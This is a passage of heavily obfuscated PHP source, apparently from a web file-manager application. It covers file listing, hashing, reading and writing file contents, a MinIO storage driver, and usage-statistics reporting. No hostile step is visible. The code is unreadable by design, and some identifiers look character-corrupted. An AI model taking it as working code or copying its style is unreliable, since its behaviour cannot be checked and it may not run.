$F¤†¥õ‹Ş[1231] => @fileatime($eÒ˜êË»“í), $F¤†¥õ‹Ş[1232] => is_readable($eÒ˜êË»“í), $F¤†¥õ‹Ş[1233] => is_writable($eÒ˜êË»“í), $F¤†¥õ‹Ş[1234] => get_mode($eÒ˜êË»“í)); return $dˆù§¤«µÚ; } private function fileInfo($a ŒÔöñÛ‹, $cíÒ•“‡Œ® = false) { $DŒ¿ÑÉÜÕ =& $_SERVER[µ…]; $d‡ÄÃšÀÇÒ = $this->iconvApp($this->pathThis($a ŒÔöñÛ‹)); if ($cíÒ•“‡Œ®) { return array($DŒ¿ÑÉÜÕ[28] => $d‡ÄÃšÀÇÒ, $DŒ¿ÑÉÜÕ[75] => $this->getPathOuter($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[29] => $DŒ¿ÑÉÜÕ[191], $DŒ¿ÑÉÜÕ[77] => $this->size($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[167] => $this->ext($d‡ÄÃšÀÇÒ)); } $f£ñ’Ì°ø‘ = array($DŒ¿ÑÉÜÕ[28] => $d‡ÄÃšÀÇÒ, $DŒ¿ÑÉÜÕ[75] => $this->getPathOuter($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[29] => $DŒ¿ÑÉÜÕ[191], $DŒ¿ÑÉÜÕ[192] => @filectime($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[83] => @filemtime($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[1231] => @fileatime($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[77] => $this->size($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[167] => $this->ext($d‡ÄÃšÀÇÒ), $DŒ¿ÑÉÜÕ[1232] => is_readable($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[1233] => is_writable($a ŒÔöñÛ‹), $DŒ¿ÑÉÜÕ[1234] => get_mode($a ŒÔöñÛ‹)); return $f£ñ’Ì°ø‘; } public function exist($Eè‰¥Ë©±) { $Eè‰¥Ë©± = $this->iconvSystem($Eè‰¥Ë©±); return @file_exists($Eè‰¥Ë©±); } public function isFile($eÒŸàÉí…Ø) { $eÒŸàÉí…Ø = $this->iconvSystem($eÒŸàÉí…Ø); return @is_file($eÒŸàÉí…Ø); } public function isFolder($fï¡ôÀøè) { $fï¡ôÀøè = $this->iconvSystem($fï¡ôÀøè); return @is_dir($fï¡ôÀøè); } public function listPath($cå‚ÑŠë…Ó, $cª£ëˆÀÜ” = false) { goto d§åÈÛ£Ñ; d§åÈÛ£Ñ: $d‚—åÉ¦òÜ =& $_SERVER[µ…]; $cå‚ÑŠë…Ó = $this->iconvSystem($cå‚ÑŠë…Ó); $cå‚ÑŠë…Ó = rtrim($cå‚ÑŠë…Ó, $d‚—åÉ¦òÜ[8]) . $d‚—åÉ¦òÜ[8]; goto aµáéŒ«î¢; EÑÓöÄ‘â: closedir($fœó™Ş—Ÿâ); return $c…ŠÏÙ; goto DÔ¥ùÎâŞ½; aµáéŒ«î¢: $c…ŠÏÙ = array($d‚—åÉ¦òÜ[74] => array(), $d‚—åÉ¦òÜ[73] => array()); if (!($fœó™Ş—Ÿâ = @opendir($cå‚ÑŠë…Ó))) { return $c…ŠÏÙ; } while (($B°Ä„š¸ÒÒ = readdir($fœó™Ş—Ÿâ)) !== !1) { if ($B°Ä„š¸ÒÒ == $d‚—åÉ¦òÜ[94] || $B°Ä„š¸ÒÒ == $d‚—åÉ¦òÜ[1228]) { continue; } $a’Šë…ëÒ = $cå‚ÑŠë…Ó . $B°Ä„š¸ÒÒ; if (is_file($a’Šë…ëÒ)) { $c…ŠÏÙ[$d‚—åÉ¦òÜ[73]][] = $this->fileInfo($a’Šë…ëÒ, $cª£ëˆÀÜ”); } else { $c…ŠÏÙ[$d‚—åÉ¦òÜ[74]][] = $this->folderInfo($a’Šë…ëÒ, $cª£ëˆÀÜ”); } } goto EÑÓöÄ‘â; DÔ¥ùÎâŞ½: } public function listAll($eËÖ¼°¿è¦, &$FÓÀÕ»¾‡½ = array()) { goto b¥îİÅ°çÑ; b¥îİÅ°çÑ: $AòĞ‘ø²Œå =& $_SERVER[µ…]; $eËÖ¼°¿è¦ = $this->iconvSystem($eËÖ¼°¿è¦); $eËÖ¼°¿è¦ = rtrim($eËÖ¼°¿è¦, $AòĞ‘ø²Œå[8]) . $AòĞ‘ø²Œå[8]; goto f´‘Û® Ô¢; fÖçÀé•Í: return $FÓÀÕ»¾‡½; goto A¡ªõ„ğ; f´‘Û® Ô¢: if (!($E–ï‡ÕÇ» = @opendir($eËÖ¼°¿è¦))) { return $FÓÀÕ»¾‡½; } while (($f¿Ç³‰Œ§ˆ = readdir($E–ï‡ÕÇ»)) !== !1) { if ($f¿Ç³‰Œ§ˆ == $AòĞ‘ø²Œå[94] || $f¿Ç³‰Œ§ˆ == $AòĞ‘ø²Œå[1228]) { continue; } $C‡Ü¹†Îàù = $eËÖ¼°¿è¦ . $f¿Ç³‰Œ§ˆ; if (is_dir($C‡Ü¹†Îàù) && !is_link($C‡Ü¹†Îàù)) { $FÓÀÕ»¾‡½[] = array($AòĞ‘ø²Œå[75] => $C‡Ü¹†Îàù . $AòĞ‘ø²Œå[8], $AòĞ‘ø²Œå[76] => 1, $AòĞ‘ø²Œå[83] => @filemtime($C‡Ü¹†Îàù), $AòĞ‘ø²Œå[77] => 0); $this->listAll($C‡Ü¹†Îàù, $FÓÀÕ»¾‡½); } else { $FÓÀÕ»¾‡½[] = array($AòĞ‘ø²Œå[75] => $C‡Ü¹†Îàù, $AòĞ‘ø²Œå[76] => 0, $AòĞ‘ø²Œå[83] => @filemtime($C‡Ü¹†Îàù), $AòĞ‘ø²Œå[77] => $this->size($C‡Ü¹†Îàù)); } } closedir($E–ï‡ÕÇ»); goto fÖçÀé•Í; A¡ªõ„ğ: } public function has($d´›Äº², $eíƒé¦¹ = false, $D¦Ø¸ÔÃ–Ó = true) { goto C¼äó†ïÀï; Dªƒ²ô†àœ: if ($eíƒé¦¹) { return array($a„ØÔ’÷¯[201] => $fÁ±™Å§‚, $a„ØÔ’÷¯[202] => $a†İÔ×¤Ï); } return !1; goto Aî™—¼´¨; C¼äó†ïÀï: $a„ØÔ’÷¯ =& $_SERVER[µ…]; $d´›Äº² = $this->iconvSystem($d´›Äº²); $d´›Äº² = rtrim($d´›Äº², $a„ØÔ’÷¯[8]) . $a„ØÔ’÷¯[8]; goto Eè®Â‚¤Ô; Eè®Â‚¤Ô: if (!($eÔšÃóÄĞÉ = @opendir($d´›Äº²))) { return !1; } $fÁ±™Å§‚ = 0; $a†İÔ×¤Ï = 0; goto b„ƒàâ¾; b„ƒàâ¾: $Eœ…¨ôîæ = 0; while (($eÖ¨Äë§ˆ§ = readdir($eÔšÃóÄĞÉ)) !== !1) { if ($eÖ¨Äë§ˆ§ == $a„ØÔ’÷¯[94] || $eÖ¨Äë§ˆ§ == $a„ØÔ’÷¯[1228]) { continue; } $f§„§›™Æ‹ = $d´›Äº² . $eÖ¨Äë§ˆ§; if ($eíƒé¦¹) { $Eœ…¨ôîæ++; if (@is_file($f§„§›™Æ‹)) { $fÁ±™Å§‚++; } else { $a†İÔ×¤Ï++; } if ($Eœ…¨ôîæ > 10000) { break; } continue; } if ($D¦Ø¸ÔÃ–Ó) { if (@is_file($f§„§›™Æ‹)) { return !0; } } else { if (@is_dir($f§„§›™Æ‹ . $a„ØÔ’÷¯[8])) { return !0; } } } closedir($eÔšÃóÄĞÉ); goto Dªƒ²ô†àœ; Aî™—¼´¨: } public function hashSimple($f†‘ã‚Š¾¬) { goto D°æ»ß×¼·; E’»Øİ˜™: $AŞ†Ô¿¬·’ = fopen($f†‘ã‚Š¾¬, $A‘øÄØğÍÌ[1235]); if (!$AŞ†Ô¿¬·’) { return $cÔŸ¡•†Ñ‰; } for ($Aª·íŠ‚ = 0; $Aª·íŠ‚ < $C”˜ÀÆ¯–†; $Aª·íŠ‚++) { fseek_64($AŞ†Ô¿¬·’, $F„…ĞÌêêµ * $Aª·íŠ‚); $cÔŸ¡•†Ñ‰ .= fread($AŞ†Ô¿¬·’, $f‹»…‘ÀØ–); } goto F×¡æâ«Ğï; F×¡æâ«Ğï: fseek_64($AŞ†Ô¿¬·’, $CÂø°Àå - $f‹»…‘ÀØ–); $cÔŸ¡•†Ñ‰ .= fread($AŞ†Ô¿¬·’, $f‹»…‘ÀØ–); fclose($AŞ†Ô¿¬·’); goto Fá®À¯ñ­Å; EØ¸İÒÀ³ß: $CÂø°Àå = $this->size($f†‘ã‚Š¾¬); $f‹»…‘ÀØ– = 200; $C”˜ÀÆ¯–† = 50; goto eÒİª“ö; Fá®À¯ñ­Å: return md5($cÔŸ¡•†Ñ‰) . $CÂø°Àå; goto A‚«Ï˜„«à; eÒİª“ö: if ($CÂø°Àå <= $f‹»…‘ÀØ– * $C”˜ÀÆ¯–†) { return $this->hashMd5($f†‘ã‚Š¾¬) . $CÂø°Àå; } $cÔŸ¡•†Ñ‰ = $A‘øÄØğÍÌ[33]; $F„…ĞÌêêµ = intval($CÂø°Àå / $C”˜ÀÆ¯–†); goto E’»Øİ˜™; D°æ»ß×¼·: $A‘øÄØğÍÌ =& $_SERVER[µ…]; if (!$f†‘ã‚Š¾¬) { return md5($A‘øÄØğÍÌ[33]); } $f†‘ã‚Š¾¬ = $this->iconvSystem($f†‘ã‚Š¾¬); goto EØ¸İÒÀ³ß; A‚«Ï˜„«à: } public function getContent($C©Æ˜‹Å„Ã) { $C©Æ˜‹Å„Ã = $this->iconvSystem($C©Æ˜‹Å„Ã); return file_get_contents($C©Æ˜‹Å„Ã); } public function setContent($a¦˜†‰—, $D¨‹‹ Œ¥ = '') { $a¦˜†‰— = $this->iconvSystem($a¦˜†‰—); $dŞ“‘ïŸ† = @file_put_contents($a¦˜†‰—, $D¨‹‹ Œ¥, LOCK_EX); clearstatcache(); return $dŞ“‘ïŸ† === !1 ? !1 : !0; } public function fileSubstr($f“ÊŒƒù„Ñ, $C‡Úï§› • = 0, $a‘ƒÑÖÚØé = false) { goto e¬Š±­ººÅ; Cøİ¾ÌÜÈŒ: if ($a‘ƒÑÖÚØé <= 0) { return $Bô„‹¿Ô×[33]; } $AÎçî’ï‰¢ = fopen($f“ÊŒƒù„Ñ, $Bô„‹¿Ô×[1235]); if (!$AÎçî’ï‰¢) { return !1; } goto CôŸÅ„Î£«; CôŸÅ„Î£«: fseek_64($AÎçî’ï‰¢, $C‡Úï§› •); $d †³À»Ë = fread($AÎçî’ï‰¢, $a‘ƒÑÖÚØé); fclose($AÎçî’ï‰¢); goto D°æí°Ê«ƒ; D°æí°Ê«ƒ: return $d †³À»Ë; goto e«¸ôÂÏš¾; e¬Š±­ººÅ: $Bô„‹¿Ô× =& $_SERVER[µ…]; $f“ÊŒƒù„Ñ = $this->iconvSystem($f“ÊŒƒù„Ñ); if ($a‘ƒÑÖÚØé === !1) { $a‘ƒÑÖÚØé = $this->size($f“ÊŒƒù„Ñ); } goto Cøİ¾ÌÜÈŒ; e«¸ôÂÏš¾: } public function upload($d±œËŠù¾Ã, $eƒÅˆ…šÕ, $Fó¯·ÇØÉ¿ = false, $bÇ–˜·ÇÓ— = REPEAT_REPLACE) { $d‚„°‹êæ = $this->copyFile($eƒÅˆ…šÕ, $d±œËŠù¾Ã); return $d‚„°‹êæ ? $this->getPathOuter($d±œËŠù¾Ã) : !1; } public function setModifyTime($FÆÄ‡µ‘øŠ, $E¢è„·Ú = '') { @touch($FÆÄ‡µ‘øŠ, intval($E¢è„·Ú)); } public function download($CÕíÉÇ‘“, $F•ÚÁíÅ²Ÿ) { return $this->iconvSystem($CÕíÉÇ‘“); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($A¥öÚô­À ) { parent::__construct($A¥öÚô­À ); $this->signatureVersion($_SERVER[µ…][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto cÖˆ•¸›¬Ò; AšÄ‹»‹ï¬: class AnalysisModel extends ModelBaseLight { public function init($EéÂñòË‰‘) { $côìÀ¨•öÈ =& $_SERVER[µ…]; $AÆ´÷ÉÜ¤ = array($côìÀ¨•öÈ[557] => array($côìÀ¨•öÈ[29] => $côìÀ¨•öÈ[1595], $côìÀ¨•öÈ[269] => array($côìÀ¨•öÈ[220], $côìÀ¨•öÈ[715], $côìÀ¨•öÈ[1596], $côìÀ¨•öÈ[1597])), $côìÀ¨•öÈ[1598] => array($côìÀ¨•öÈ[29] => $côìÀ¨•öÈ[1599], $côìÀ¨•öÈ[269] => array($côìÀ¨•öÈ[220], $côìÀ¨•öÈ[713], $côìÀ¨•öÈ[1600], $côìÀ¨•öÈ[1601], $côìÀ¨•öÈ[1602]))); if (!isset($AÆ´÷ÉÜ¤[$EéÂñòË‰‘])) { return !1; } $this->optionType = $AÆ´÷ÉÜ¤[$EéÂñòË‰‘][$côìÀ¨•öÈ[29]]; $this->field = $AÆ´÷ÉÜ¤[$EéÂñòË‰‘][$côìÀ¨•öÈ[269]]; return !0; } public function listData($a¿ÃÑĞ¡‹£ = false, $B²Šİ¿²×² = "\155\157\144\x69\146\x79\124\151\x6d\x65", $Fé²àƒê–™ = false) { return parent::listData($a¿ÃÑĞ¡‹£, $B²Šİ¿²×², $Fé²àƒê–™); } public function trendList($B¥¥Ç”ÎË) { goto E“Î‰‡äç¥; E“Î‰‡äç¥: $aè™Š»ŸÑ =& $_SERVER[µ…]; $CõÃ£Ëãõå = $this->listData(); if ($CõÃ£Ëãõå) { $döèĞ·ˆ = end($CõÃ£Ëãõå); $eò£Œ¶ÓĞ¶ = date($aè™Š»ŸÑ[1603], strtotime($aè™Š»ŸÑ[1604])); if ($döèĞ·ˆ[$aè™Š»ŸÑ[220]] == $eò£Œ¶ÓĞ¶) { return $CõÃ£Ëãõå; } $C¼‰„¸£íõ = strtotime($döèĞ·ˆ[$aè™Š»ŸÑ[220]]); } goto F®µ½”Ç‹; F®µ½”Ç‹: if (!isset($C¼‰„¸£íõ)) { $fÆì¤¦ŞÕÚ = $B¥¥Ç”ÎË == $aè™Š»ŸÑ[557] ? $aè™Š»ŸÑ[501] : $aè™Š»ŸÑ[769]; $C¼‰„¸£íõ = Model($fÆì¤¦ŞÕÚ)->min($aè™Š»ŸÑ[192]); } $fÅ¨…›¥“ğ = $aè™Š»ŸÑ[1605] . ucfirst($B¥¥Ç”ÎË); $F˜†šßìÒ = $this->dateList($C¼‰„¸£íõ); goto Eµ»†Â‰; Eµ»†Â‰: foreach ($F˜†šßìÒ as $eò£Œ¶ÓĞ¶) { $this->{$fÅ¨…›¥“ğ}($eò£Œ¶ÓĞ¶); } return $this->listData(); goto C˜¢öÕ¯; C˜¢öÕ¯: } private function dateList($dÍ”ªæ°Š) { $BšìÀÉß =& $_SERVER[µ…]; $DêµØğîÑÁ = $dÍ”ªæ°Š; $FÁ•ÁÓ«¨õ = strtotime($BšìÀÉß[1604]); $D×´åÌÏÑ = array(); while ($DêµØğîÑÁ <= $FÁ•ÁÓ«¨õ) { $D×´åÌÏÑ[] = date($BšìÀÉß[1603], $DêµØğîÑÁ); $DêµØğîÑÁ = strtotime($BšìÀÉß[1606], $DêµØğîÑÁ); } return $D×´åÌÏÑ; } public function _recordUser($eÎÇì†Ù° = '') { goto a¶‘ Ë´‹†; c±Šç•½·£: $aÃº®ÜÜÇ = array($C°à§Ô’ä [220] => $eÎÇì†Ù°, $C°à§Ô’ä [715] => (int) $a¨Õæ¹í‘¿, $C°à§Ô’ä [1596] => (int) $càë™Í„Ó¶, $C°à§Ô’ä [1597] => (int) $eíğÏä“¯); return $this->insert($aÃº®ÜÜÇ); goto DáÁÕæè; Eà’’è‘ƒÎ: $c……Û‚¦ë = array($C°à§Ô’ä [192] => array($C°à§Ô’ä [948], $C¸Ÿ²­†‘)); $a¨Õæ¹í‘¿ = Model($C°à§Ô’ä [501])->where($c……Û‚¦ë)->count($C°à§Ô’ä [1506]); $c……Û‚¦ë[$C°à§Ô’ä [192]] = array($C°à§Ô’ä [329], array($BÖ÷„œó¥¥, $C¸Ÿ²­†‘)); goto c†™âÔÁ; a¶‘ Ë´‹†: $C°à§Ô’ä  =& $_SERVER[µ…]; $BÖ÷„œó¥¥ = strtotime(date($C°à§Ô’ä [1607], strtotime($eÎÇì†Ù°))); $C¸Ÿ²­†‘ = strtotime(date($C°à§Ô’ä [1608], strtotime($eÎÇì†Ù°))); goto Eà’’è‘ƒÎ; c†™âÔÁ: $càë™Í„Ó¶ = Model($C°à§Ô’ä [501])->where($c……Û‚¦ë)->count($C°à§Ô’ä [1506]); $c……Û‚¦ë[$C°à§Ô’ä [29]] = $C°à§Ô’ä [1609]; $eíğÏä“¯ = Model($C°à§Ô’ä [1610])->where($c……Û‚¦ë)->count($C°à§Ô’ä [1611]); goto c±Šç•½·£; DáÁÕæè: } public function _recordStore($BÉ·¥§ß‰æ = '') { goto d¨«’”ééî; d¨«’”ééî: $B¦óŠ“Êìí =& $_SERVER[µ…]; $f®çèÆôÃ’ = strtotime(date($B¦óŠ“Êìí[1608], strtotime($BÉ·¥§ß‰æ))); $Bºæïñã¾ = array($B¦óŠ“Êìí[192] => array($B¦óŠ“Êìí[948], $f®çèÆôÃ’)); goto b•«…íÛ÷; a®Ü”„¬¨: $eÇÓÔëÕŒä = Model($B¦óŠ“Êìí[769])->where($Bºæïñã¾)->sum($B¦óŠ“Êìí[77]); $D•áÕ·æà† = array($B¦óŠ“Êìí[220] => $BÉ·¥§ß‰æ, $B¦óŠ“Êìí[713] => (int) $få±àÄ‹İ£, $B¦óŠ“Êìí[1600] => (int) $aå‡°âÔ¼ˆ, $B¦óŠ“Êìí[1601] => (int) $aŸ¯’É, $B¦óŠ“Êìí[1602] => (int) $eÇÓÔëÕŒä); return $this->insert($D•áÕ·æà†); goto dçĞ£†ªáÇ; b•«…íÛ÷: $aå‡°âÔ¼ˆ = Model($B¦óŠ“Êìí[444])->where($Bºæïñã¾)->sum($B¦óŠ“Êìí[77]); $Bºæïñã¾[$B¦óŠ“Êìí[397]] = 0; $få±àÄ‹İ£ = Model($B¦óŠ“Êìí[769])->where($Bºæïñã¾)->sum($B¦óŠ“Êìí[77]); goto A·œÛ±‚×Í; A·œÛ±‚×Í: $Bºæïñã¾[$B¦óŠ“Êìí[398]] = 1; $aŸ¯’É = Model($B¦óŠ“Êìí[769])->where($Bºæïñã¾)->sum($B¦óŠ“Êìí[77]); $Bºæïñã¾[$B¦óŠ“Êìí[398]] = 2; goto a®Ü”„¬¨; dçĞ£†ªáÇ: } public function trend($Eß©™èŒÚ®, $dí‰¬Ï‹™”) { goto A” ®¨ËÉ; BÏÖ‡ÓĞÁµ: if ($c¾æ©øĞÂ½ && $dí‰¬Ï‹™” != $A£§„×°ğ‚[1480]) { $cİä÷×éµ = $c¾æ©øĞÂ½[0][$A£§„×°ğ‚[220]]; $b²–©ŞòÆ˜ = $this->validDate($dí‰¬Ï‹™”, $cİä÷×éµ); $Aİ‘ãœ„†ª = array(); $B»®£÷‚ÔÜ = array_to_keyvalue($c¾æ©øĞÂ½, $A£§„×°ğ‚[220]); foreach ($b²–©ŞòÆ˜ as $fƒï‰ÑÁÎ‡) { if (isset($B»®£÷‚ÔÜ[$fƒï‰ÑÁÎ‡])) { $AŒî·™¿‡æ = $B»®£÷‚ÔÜ[$fƒï‰ÑÁÎ‡]; } else { $AŒî·™¿‡æ = end($c¾æ©øĞÂ½); $AŒî·™¿‡æ[$A£§„×°ğ‚[220]] = $fƒï‰ÑÁÎ‡; if ($Eß©™èŒÚ® == $A£§„×°ğ‚[557]) { $AŒî·™¿‡æ[$A£§„×°ğ‚[1596]] = $AŒî·™¿‡æ[$A£§„×°ğ‚[1597]] = 0; } } $Aİ‘ãœ„†ª[] = $AŒî·™¿‡æ; } $c¾æ©øĞÂ½ = $Aİ‘ãœ„†ª; } $bÑñë…¥×ñ = array($A£§„×°ğ‚[557] => array($A£§„×°ğ‚[715] => LNG($A£§„×°ğ‚[1612]), $A£§„×°ğ‚[1596] => LNG($A£§„×°ğ‚[1613]), $A£§„×°ğ‚[1597] => LNG($A£§„×°ğ‚[1614])), $A£§„×°ğ‚[1598] => array($A£§„×°ğ‚[713] => LNG($A£§„×°ğ‚[1615]), $A£§„×°ğ‚[1600] => LNG($A£§„×°ğ‚[1616]), $A£§„×°ğ‚[1601] => LNG($A£§„×°ğ‚[1617]), $A£§„×°ğ‚[1602] => LNG($A£§„×°ğ‚[1618]))); $BšÚï¢¤è = array($A£§„×°ğ‚[557] => $A£§„×°ğ‚[1619], $A£§„×°ğ‚[1598] => $A£§„×°ğ‚[77]); goto CÁ´ê·ºÄ; f‡˜Ä¿Î˜: return $b¼ùàË¡ö; goto eŸ–ÙºöÛ; CÁ´ê·ºÄ: if (empty($c¾æ©øĞÂ½)) { $fƒï‰ÑÁÎ‡ = date($A£§„×°ğ‚[1603], strtotime($A£§„×°ğ‚[1604])); $eé°·³Æº¨ = array($A£§„×°ğ‚[220] => $fƒï‰ÑÁÎ‡); foreach ($bÑñë…¥×ñ[$Eß©™èŒÚ®] as $CĞ† Ä»ñ => $dµèƒë†Œ›) { $eé°·³Æº¨[$CĞ† Ä»ñ] = 0; } $c¾æ©øĞÂ½[] = $eé°·³Æº¨; } $b¼ùàË¡ö = array(); foreach ($c¾æ©øĞÂ½ as $dµèƒë†Œ›) { if ($Eß©™èŒÚ® == $A£§„×°ğ‚[1598] && $dµèƒë†Œ›[$A£§„×°ğ‚[1600]] > $dµèƒë†Œ›[$A£§„×°ğ‚[713]]) { $dµèƒë†Œ›[$A£§„×°ğ‚[1600]] = $dµèƒë†Œ›[$A£§„×°ğ‚[713]]; } foreach ($bÑñë…¥×ñ[$Eß©™èŒÚ®] as $CĞ† Ä»ñ => $BÔªùÇÇÏ) { $AŒî·™¿‡æ = array($A£§„×°ğ‚[220] => $dµèƒë†Œ›[$A£§„×°ğ‚[220]], $A£§„×°ğ‚[1411] => $BÔªùÇÇÏ); $AŒî·™¿‡æ[$BšÚï¢¤è[$Eß©™èŒÚ®]] = isset($dµèƒë†Œ›[$CĞ† Ä»ñ]) ? $dµèƒë†Œ›[$CĞ† Ä»ñ] : 0; $b¼ùàË¡ö[] = $AŒî·™¿‡æ; } } goto f‡˜Ä¿Î˜; A” ®¨ËÉ: $A£§„×°ğ‚ =& $_SERVER[µ…]; if (!$this->init($Eß©™èŒÚ®)) { return !1; } $c¾æ©øĞÂ½ = $this->trendList($Eß©™èŒÚ®); goto BÏÖ‡ÓĞÁµ; eŸ–ÙºöÛ: } public function validDate($e‚¼ÛŒÆ, $A¡Ï¥×Ì) { goto cƒÂö—»¸×; d‚—Ë¡‹» : switch ($e‚¼ÛŒÆ) { case $eÒ¡íÓ¸Œš[1487]: $B‘ĞÚõ·Á = mktime(0, 0, 0, date($eÒ¡íÓ¸Œš[1620]), date($eÒ¡íÓ¸Œš[1229]) - date($eÒ¡íÓ¸Œš[1293]) + 7 - 7, date($eÒ¡íÓ¸Œš[1621])); $f¨ÎŠˆ¤”¬ = 0; do { $a³¬”ŞÚ§‹ = date($eÒ¡íÓ¸Œš[1603], $B‘ĞÚõ·Á - 3600 * 24 * 7 * $f¨ÎŠˆ¤”¬); $c†ŒÎ‚ß±Ï[] = $a³¬”ŞÚ§‹; $f¨ÎŠˆ¤”¬++; } while ($A¡Ï¥×Ì < $a³¬”ŞÚ§‹); break; case $eÒ¡íÓ¸Œš[1485]: $f¨ÎŠˆ¤”¬ = 1; do { $a³…ÆàİÕÓ = date($eÒ¡íÓ¸Œš[1622], strtotime("\x2d\x20{$f¨ÎŠˆ¤”¬}\40\155\157\156\164\x68\163")); $c†ŒÎ‚ß±Ï[] = $a³…ÆàİÕÓ; $f¨ÎŠˆ¤”¬++; } while ($A¡Ï¥×Ì < $a³…ÆàİÕÓ); break; case $eÒ¡íÓ¸Œš[1623]: $aµÆ•¦çèŠ = (int) date($eÒ¡íÓ¸Œš[1621], strtotime($A¡Ï¥×Ì)); $b…½İ‚ÔÁ = (int) date($eÒ¡íÓ¸Œš[1621]); if ($aµÆ•¦çèŠ >= $b…½İ‚ÔÁ) { break; } for ($aµÆ•¦çèŠ; $aµÆ•¦çèŠ < $b…½İ‚ÔÁ; $aµÆ•¦çèŠ++) { $c†ŒÎ‚ß±Ï[] = $aµÆ•¦çèŠ . $eÒ¡íÓ¸Œš[1624]; } break; default: break; } if ($A¡Ï¥×Ì > end($c†ŒÎ‚ß±Ï)) { array_pop($c†ŒÎ‚ß±Ï); } sort($c†ŒÎ‚ß±Ï); goto cÁÓ‡í­çØ; cÁÓ‡í­çØ: return $c†ŒÎ‚ß±Ï; goto aéÖ‚à‹; cƒÂö—»¸×: $eÒ¡íÓ¸Œš =& $_SERVER[µ…]; $FÈ„ƒÉï‡† = date($eÒ¡íÓ¸Œš[1603], strtotime($eÒ¡íÓ¸Œš[1604])); $c†ŒÎ‚ß±Ï = array($FÈ„ƒÉï‡†); goto d‚—Ë¡‹» ; aéÖ‚à‹: } public function listTable($Bì»Ñ™­À) { $bçÄÀØÆñÀ = ucfirst($Bì»Ñ™­À); return Model($bçÄÀØÆñÀ)->listData(); } public function option($CÅ–Ÿ–á×‰) { $Eê•¤Ïè•² = $_SERVER[µ…][1625] . ucfirst($CÅ–Ÿ–á×‰); return $this->{$Eê•¤Ïè•²}(); } private function optionUser() { goto böîÎÇ­ËÑ; EïœÙì«Àà: return array($FèÒŞÎ…ª[710] => (int) $Bº¾ŸÌâà¥, $FèÒŞÎ…ª[1628] => (int) ($Bº¾ŸÌâà¥ - $d¡Ù —îŠÃ), $FèÒŞÎ…ª[1629] => (int) $d¡Ù —îŠÃ, $FèÒŞÎ…ª[1630] => (int) $e¾ˆÁ‡š³Ø, $FèÒŞÎ…ª[1631] => $D¦ÍÌä¼‰‘); goto BƒİÁÔ›ğ; A™îĞ´ø·¶: if (!$D¦ÍÌä¼‰‘) { $D¦ÍÌä¼‰‘ = 1; } $Dßô‹×º‹â = array($FèÒŞÎ…ª[1627] => array($FèÒŞÎ…ª[949], $BŠÆÑŒâ)); $e¾ˆÁ‡š³Ø = Model($FèÒŞÎ…ª[501])->where($Dßô‹×º‹â)->count($FèÒŞÎ…ª[1506]); goto EïœÙì«Àà; b¤ÔÇ³˜Íä: if ($DÓ¤Ñ¬‚ƒ < $BŠÆÑŒâ) { $DÓ¤Ñ¬‚ƒ = $BŠÆÑŒâ; } $Dßô‹×º‹â = array($FèÒŞÎ…ª[1627] => array($FèÒŞÎ…ª[949], $DÓ¤Ñ¬‚ƒ)); $D¦ÍÌä¼‰‘ = (int) Model($FèÒŞÎ…ª[501])->where($Dßô‹×º‹â)->count($FèÒŞÎ…ª[1506]); goto A™îĞ´ø·¶; eî·¾ä«‰Ó: $BÒˆë’öÌ = intval($GLOBALS[$FèÒŞÎ…ª[6]][$FèÒŞÎ…ª[345]][$FèÒŞÎ…ª[1465]]) / 3600; $DÓ¤Ñ¬‚ƒ = strtotime("\55{$BÒˆë’öÌ}\x20\150\157\165\x72\x73"); $BŠÆÑŒâ = strtotime(date($FèÒŞÎ…ª[1607])); goto b¤ÔÇ³˜Íä; böîÎÇ­ËÑ: $FèÒŞÎ…ª =& $_SERVER[µ…]; $Bº¾ŸÌâà¥ = Model($FèÒŞÎ…ª[501])->count($FèÒŞÎ…ª[1506]); $d¡Ù —îŠÃ = Model($FèÒŞÎ…ª[501])->where($FèÒŞÎ…ª[1626])->count($FèÒŞÎ…ª[1506]); goto eî·¾ä«‰Ó; BƒİÁÔ›ğ: } private function optionFile() { goto cîñ„ƒàï; c˜ÛÛÁ»ïà: $E‚‰ÄÛ£İ = Model($Bä¸³®·‡Ã[769])->where($FáË…ñ‹Ø)->sum($Bä¸³®·‡Ã[77]); $AØö„×ß = Model($Bä¸³®·‡Ã[769])->where($FáË…ñ‹Ø)->count($Bä¸³®·‡Ã[390]); return array($Bä¸³®·‡Ã[713] => $e×Âİ¸¢Öß, $Bä¸³®·‡Ã[1600] => $bŠ­±Ô±·, $Bä¸³®·‡Ã[1632] => $e×Âİ¸¢Öß - $bŠ­±Ô±·, $Bä¸³®·‡Ã[1633] => (int) $E‚‰ÄÛ£İ, $Bä¸³®·‡Ã[715] => (int) $FàùŞ Ïñè, $Bä¸³®·‡Ã[1634] => (int) $AØö„×ß); goto f‰«ÕÊë†‰; cîñ„ƒàï: $Bä¸³®·‡Ã =& $_SERVER[µ…]; $F„ÆÌ‡çÁ = $this->sourceSize(); $e×Âİ¸¢Öß = $F„ÆÌ‡çÁ[$Bä¸³®·‡Ã[77]]; goto aÒ¼…‹ø; aÒ¼…‹ø: $bŠ­±Ô±· = $F„ÆÌ‡çÁ[$Bä¸³®·‡Ã[1600]]; $FàùŞ Ïñè = Model($Bä¸³®·‡Ã[769])->where(array($Bä¸³®·‡Ã[397] => 0))->count($Bä¸³®·‡Ã[390]); $FáË…ñ‹Ø = array($Bä¸³®·‡Ã[397] => 0, $Bä¸³®·‡Ã[192] => array($Bä¸³®·‡Ã[949], strtotime(date($Bä¸³®·‡Ã[1607])))); goto c˜ÛÛÁ»ïà; f‰«ÕÊë†‰: } private function optionAccess() { $f‡˜õ„¡øï =& $_SERVER[µ…]; return array($f‡˜õ„¡øï[710] => $this->typeLogCnt(), $f‡˜õ„¡øï[106] => $this->typeLogCnt($f‡˜õ„¡øï[106]), $f‡˜õ„¡øï[424] => $this->typeLogCnt($f‡˜õ„¡øï[424]), $f‡˜õ„¡øï[1635] => $this->typeLogCnt($f‡˜õ„¡øï[1635]), $f‡˜õ„¡øï[1636] => $this->typeLogCnt($f‡˜õ„¡øï[1636]), $f‡˜õ„¡øï[557] => 